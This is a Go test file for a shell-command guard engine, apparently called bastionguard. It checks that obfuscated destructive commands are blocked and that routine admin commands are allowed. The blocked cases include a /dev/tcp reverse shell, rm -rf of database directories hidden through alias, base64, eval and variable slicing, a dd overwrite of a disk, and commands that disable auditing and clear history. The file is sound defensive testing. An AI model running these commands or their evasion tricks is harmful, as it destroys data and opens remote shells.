package engine_test

import (
	"testing"

	"bastionguard/internal/engine"
	"bastionguard/internal/policy"
)

func mustCatalog(t *testing.T) *policy.Catalog {
	t.Helper()
	cat, err := policy.Load("../../configs/default-policy.yaml")
	if err != nil {
		t.Fatalf("load catalog: %v", err)
	}
	return cat
}

func eval(t *testing.T, line string) *engine.Decision {
	t.Helper()
	cat := mustCatalog(t)
	ev := engine.New(engine.NewSessionState(), cat, "ops")
	dec, _ := ev.EvaluateLine(line)
	return dec
}

// TestBypassObfuscation covers the exact evasion classes from the requirements:
// alias, variable splitting, script files, encoding, nested substitution.
func TestBypassObfuscation(t *testing.T) {
	cases := []struct {
		name string
		cmds []string // sequential lines sharing one session
	}{
		{
			name: "alias 包装 rm",
			cmds: []string{"alias cleaner='rm -rf /var/lib/mysql'", "cleaner"},
		},
		{
			name: "变量拼接路径",
			cmds: []string{"D=/var/lib/mysql", "rm -rf $D"},
		},
		{
			name: "字符串切片混淆",
			// "armless"[1:3] == "rm"，用变量切片拼出命令名绕过字符串匹配
			cmds: []string{"x=armless; y=${x:1:2}", "$y -rf /var/lib/mysql"},
		},
		{
			name: "base64 编码 rm",
			cmds: []string{"echo cm0gLXJmIC92YXIvbGliL215c3FsCg== | base64 -d | sh"},
		},
		{
			name: "写脚本再执行",
			cmds: []string{
				"cat > /tmp/clean.sh <<'EOF'\nrm -rf /var/lib/mysql\nEOF",
				"bash /tmp/clean.sh",
			},
		},
		{
			name: "命令替换嵌套",
			cmds: []string{"rm -rf $(echo /var/lib/mysql)"},
		},
		{
			name: "find -exec 绕过",
			cmds: []string{"find /var/lib/mysql -name '*.ibd' -exec rm -f {} +"},
		},
		{
			name: "sudo 包裹",
			cmds: []string{"sudo rm -rf /etc"},
		},
		{
			name: "ssh 远程删库",
			cmds: []string{"ssh db-01 'rm -rf /var/lib/mysql'"},
		},
		{
			name: "重定向清空系统文件",
			cmds: []string{": > /etc/passwd"},
		},
		{
			name: "dd 写裸盘",
			cmds: []string{"dd if=/dev/zero of=/dev/sda bs=1M count=1"},
		},
		{
			name: "关审计服务",
			cmds: []string{"systemctl stop auditd"},
		},
		{
			name: "history 清痕迹",
			cmds: []string{"history -c"},
		},
		{
			name: "反弹 shell",
			cmds: []string{"bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"},
		},
		{
			name: "docker 特权容器",
			cmds: []string{"docker run --privileged -it alpine sh"},
		},
		{
			name: "mysql 删库",
			cmds: []string{"mysql -e 'DROP DATABASE orders;'"},
		},
		{
			name: "管道 SQL 清表",
			cmds: []string{"echo 'TRUNCATE TABLE orders;' | mysql appdb"},
		},
		{
			name: "xargs 动态 rm",
			cmds: []string{"find /data -name '*.log' | xargs rm -f"},
		},
		{
			name: "eval 混淆",
			cmds: []string{"eval 'r''m -rf /var/lib/mysql'"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cat := mustCatalog(t)
			ev := engine.New(engine.NewSessionState(), cat, "ops")
			var last *engine.Decision
			for _, line := range tc.cmds {
				d, _ := ev.EvaluateLine(line)
				last = d
			}
			if last == nil {
				t.Fatal("no decision")
			}
			if last.Allow {
				t.Errorf("期望拦截但被放行，最后裁决: %+v", last)
			} else {
				t.Logf("已正确拦截: %s", last.DenyReason)
			}
		})
	}
}

// TestBenignCommands guarantees normal operations stay frictionless.
func TestBenignCommands(t *testing.T) {
	benign := []string{
		"ls -la /var/log",
		"cd /opt/app && pwd",
		"cat /etc/hosts",
		"grep error /var/log/messages | head -20",
		"systemctl status nginx",
		"df -h",
		"free -m",
		"ps -ef | grep java",
		"tail -f /var/log/app.log",
		"echo 'hello world'",
		"curl -s https://internal.example.com/health",
		"mysql -e 'SELECT COUNT(*) FROM orders;'",
		"rm /tmp/junk-1234.tmp",
		"mkdir -p /opt/app/logs",
		"tar czf /tmp/backup.tgz /opt/app/conf",
		"docker ps",
		"kubectl get pods",
		"apt-get install -y htop",
		"DATE=$(date +%F); echo $DATE",
		"for h in app-01 app-02; do echo $h; done",
	}
	for _, line := range benign {
		t.Run(line, func(t *testing.T) {
			d := eval(t, line)
			if !d.Allow {
				t.Errorf("正常命令被误拦: %s\n原因: %s", line, d.DenyReason)
			}
		})
	}
}
